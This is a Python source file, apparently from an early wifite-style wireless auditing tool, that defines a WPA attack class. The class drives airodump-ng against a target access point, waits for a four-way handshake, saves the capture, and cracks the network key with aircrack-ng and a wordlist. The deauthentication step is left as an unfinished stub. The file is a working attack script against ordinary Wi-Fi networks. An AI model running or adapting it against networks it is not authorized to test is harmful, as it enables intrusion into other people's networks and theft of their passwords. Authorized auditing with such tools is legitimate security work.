#!/usr/bin/python

from Attack import Attack
from Airodump import Airodump
from Color import Color
from Configuration import Configuration
from Handshake import Handshake
from Process import Process
from WPAResult import WPAResult

import time

class AttackWPA(Attack):
    def __init__(self, target):
        super(AttackWPA, self).__init__(target)
        self.crack_result = None

    def run(self):
        '''
            Initiates full WPA hanshake capture attack.
        '''
        # First, start Airodump process
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      output_file_prefix='wpa') as airodump:

            Color.p('\r{+} {O}waiting{W} for target to appear...')
            airodump_target = self.wait_for_target(airodump)
 
            clients = airodump_target.clients
            client_index = 0

            handshake = None

            time_since_deauth = time.time()

            while True:
                Color.p('\r %s' % (' ' * 45))
                Color.p('\r{+} waiting for {C}handshake{W}...')
                time.sleep(1)
                # Find .cap file
                cap_files = airodump.find_files(endswith='.cap')
                if len(cap_files) == 0:
                    # No cap files yet
                    continue
                cap_file = cap_files[0]
                # Check for Handshake
                bssid = airodump_target.bssid
                essid = None
                if airodump_target.essid_known:
                    essid = airodump_target.essid
                handshake = Handshake(cap_file, bssid=bssid, essid=essid)
                if handshake.has_handshake():
                    # We got a handshake
                    Color.pl(' {G}captured handshake!{W}')
                    break

                # TODO: Send deauth to a client or broadcast
                if time.time()-time_since_deauth > Configuration.wpa_deauth_timeout:
                    if len(clients) == 0 or client_index >= len(clients):
                        # Send deauth for broadcoast
                        client_index = 0
                    else:
                        # Send deauth for client
                        client = clients[client_index]
                        client_index += 1
                    time_since_deauth = time.time()
                continue

            if not handshake:
                # No handshake, attack failed.
                raise Exception('Handshake not captured')
                return False

            key = None

            # TODO: Save copy of handshake to ./hs/
            import os
            if not os.path.exists('hs'):
                os.mkdir('hs')
            import re
            essid_safe = re.sub('[^a-zA-Z0-9]', '', handshake.essid)
            bssid_safe = handshake.bssid.replace(':', '-')
            date = time.strftime('%Y-%m-%dT%H-%M-%S')
            cap_filename = 'handshake_%s_%s_%s.cap' % (essid_safe, bssid_safe, date)
            cap_filename = os.path.join('hs', cap_filename)
            from shutil import copy
            Color.p('{+} saving copy of {C}handshake{W} to {C}%s{W} ' % cap_filename)
            copy(handshake.capfile, cap_filename)
            Color.pl(' {G}saved{W}')
            handshake.capfile = cap_filename

            # TODO: Crack handshake
            wordlist = Configuration.wordlist
            if wordlist != None:
                if not os.path.exists(wordlist):
                    Color.pl('{!} {R}unable to crack:' + 
                             ' wordlist {O}%s{R} does not exist{W}' % wordlist)
                else:
                    # We have a wordlist we can use
                    Color.p('{+} {G}cracking{W} handshake using {C}%s{W} wordlist'
                                % wordlist.split(os.sep)[-1])

                    # TODO: More-verbose cracking status
                    # 1. Read number of lines in 'wordlist'
                    # 2. Pipe aircrack stdout to file
                    # 3. Read from file every second, get keys tried so far
                    # 4. Display # of keys tried / total keys, and ETA

                    key_file = Configuration.temp('wpakey.txt')
                    command = [
                        'aircrack-ng',
                        '-a', '2',
                        '-w', wordlist,
                        '-l', key_file,
                        handshake.capfile
                    ]
                    aircrack = Process(command, devnull=True)
                    aircrack.wait()
                    if os.path.exists(key_file):
                        # We cracked it.
                        Color.pl('{G}cracked{W}')
                        f = open(key_file, 'r')
                        key = f.read()
                        f.close()
                    else:
                        Color.pl('{R}failed{W}')

            self.crack_result = WPAResult(bssid, essid, handshake.capfile, key)
            self.crack_result.dump()
            return True


if __name__ == '__main__':
    from Target import Target
    fields = "A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  11,  54e,WPA, WPA, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, ".split(',')
    target = Target(fields)
    wpa = AttackWPA(target)
    wpa.run()

